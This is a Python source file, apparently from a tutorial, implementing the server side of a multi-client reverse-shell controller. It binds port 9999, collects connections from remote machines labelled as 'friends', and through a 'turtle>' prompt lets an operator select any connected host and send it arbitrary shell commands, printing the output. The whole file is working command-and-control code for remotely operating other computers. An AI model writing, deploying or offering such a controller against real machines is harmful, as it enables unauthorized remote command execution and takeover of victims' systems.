import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2] #Job_number 1: listen and accept cpnnections from other clients
                    # Job_number 2: creating turtle and sending commands to an already connected client

queue = Queue()
all_connections = []
all_address = []

# Create a socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s

        host =""
        port = 9999
        s= socket.socket()

    except socket.error as msg:
        print("Socket creation error: "+str(msg))

# Binding the socket and listening for connections
def bind_socket():

    try:
        global host
        global port
        global s

        print("Binding the port: "+ str(port))

        s.bind((host,port))
        s.listen(5)


    except socket.error as msg:
        print("Socket Binding error"+ str(msg)+"\n"+"Retrying...")
        bind_socket()

#Handling connection from multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address = s.accept()
            s.setblocking(1) # prevents timeout
            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established" + address[0])

        except:
            print("Error excepting connections")

# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
# Interactive prompt from sending commands
# turtle> list
# 0 Friend-A port
# 1 Friend-B port
# 2 Friend-C port
# turtle> select 1


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("command not recognized")

# Display all current active connections with the client
def list_connections():
    results=''

    for i,conn in enumerate(all_connections):
        try: # test to see if the particular connection is still active or not
            conn.send(str.encode(' '))
            conn.recv(201480)

        except: # delete the particular connection and address
            del all_connections[i]
            del all_address[i]
            continue

        results = str(i) + "  "+str(all_address[i][0]) + "  "+str(all_address[i][1])+ "\n" # get the ip address: position 0 and port: position 1

    print("-----Clients----"+"\n"+results)

# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') # target = id [ remove the select command and excess space]
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to :"+ str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="") #192.168.0.4> #end="" prevents the cursor going to the nextline
        return conn

    except:
        print("Selection not valid")
        return None

# Send commands to client or a friend
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(201480),"utf-8") # what ever response is received from the clients side
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job that is in the queue ( handle connection, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()